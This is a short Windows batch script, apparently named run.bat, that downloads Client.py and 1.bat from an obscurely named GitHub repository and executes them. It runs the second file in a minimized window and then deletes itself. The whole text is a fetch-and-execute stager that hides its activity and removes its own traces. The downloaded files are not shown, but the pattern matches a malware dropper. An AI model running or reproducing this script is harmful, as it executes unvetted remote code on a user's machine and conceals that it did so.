curl -o Client.py https://raw.githubusercontent.com/oogabooga245/-/main/Client.py
python3 Client.py
timeout 10 >null
curl -o 1.bat https://raw.githubusercontent.com/oogabooga245/-/main/1.bat
START /MIN CMD.EXE /C 1.bat
del run.bat
exit
